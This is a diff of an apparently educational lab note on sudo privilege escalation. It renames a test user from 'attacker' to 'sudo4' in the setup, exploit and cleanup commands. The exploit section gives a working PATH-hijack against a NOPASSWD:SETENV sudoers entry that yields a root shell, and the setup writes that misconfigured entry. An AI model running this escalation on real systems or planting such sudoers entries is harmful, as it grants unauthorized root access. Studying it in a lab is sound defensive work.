@@ -3,17 +3,17 @@
 ```sh
 # root
 cp /etc/sudoers /etc/sudoers.bak
-adduser attacker
-echo "attacker ALL=(ALL) NOPASSWD:SETENV: /home/attacker/script.sh" >> /etc/sudoers
-echo 'ls -la' > /home/attacker/script.sh
-chmod +x /home/attacker/script.sh
+adduser sudo4
+echo "sudo4 ALL=(ALL) NOPASSWD:SETENV: /home/sudo4/script.sh" >> /etc/sudoers
+echo 'ls -la' > /home/sudo4/script.sh
+chmod +x /home/sudo4/script.sh
 ```
 
 # Exploit
 
 ```bash
 echo '/bin/bash' > /tmp/ls
-sudo PATH=/tmp/:$PATH /home/attacker/script.sh
+sudo PATH=/tmp/:$PATH /home/sudo4/script.sh
 ```
 
 # Mitigate
@@ -25,6 +25,6 @@ sudo PATH=/tmp/:$PATH /home/attacker/script.sh
 # Clean Up
 
 ```bash
-deluser attacker --remove-home
+deluser sudo4 --remove-home
 cp /etc/sudoers.bak /etc/sudoers
 ```
